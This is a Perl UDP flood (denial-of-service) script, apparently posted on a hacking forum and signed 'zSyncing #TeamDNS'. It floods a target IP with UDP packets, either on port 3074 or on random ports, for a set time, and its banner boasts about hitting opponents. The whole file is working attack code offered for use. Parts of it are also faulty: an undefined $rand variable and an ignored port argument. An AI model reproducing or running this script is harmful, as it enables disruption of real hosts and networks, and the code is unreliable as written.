
#http://www.hackforums.net/showthread.php?tid=4108769

use Socket;


$ARGC=@ARGV;



if ($ARGC !=3) {

 printf "To initiate a UDP Attack\n";

 printf "perl $0 ip port time\n";

 printf "Coded by zSyncing\n";

 printf "#TeamDNS\n";

 exit(1);

}


 my ($ip,$port,$size,$time);

 $ip=$ARGV[0];

 $port= 3074;
 
$time=$ARGV[2];
 socket(crazy, PF_INET, SOCK_DGRAM, 17);

 $iaddr = inet_aton("$ip");



 printf "

         Don't Tap them Smack Them
           @akaSync == zSyncing
                 #TeamDNS
           Corpsey Run that Bitch


        
";




if ($ARGV[1] ==0 && $ARGV[2] ==0) {

 goto randpackets;
}

if ($ARGV[1] !=0 && $ARGV[2] !=0) {

 system("(sleep $time;killall -9 udp) &");

 goto packets;

}

if ($ARGV[1] !=0 && $ARGV[2] ==0) {

 goto packets;

}

if ($ARGV[1] ==0 && $ARGV[2] !=0) {

 system("(sleep $time;killall -9 udp) &");
 
 goto randpackets;

}


packets:
for (;;) {

 $size=$rand x $rand x $rand;

 send(crazy, 0, $size, sockaddr_in($port, $iaddr));

} 


randpackets:
for (;;) {

 $size=$rand x $rand x $rand;

 $port=int(rand 65555) +1;

 send(crazy, 0, $size, sockaddr_in($port, $iaddr));




} 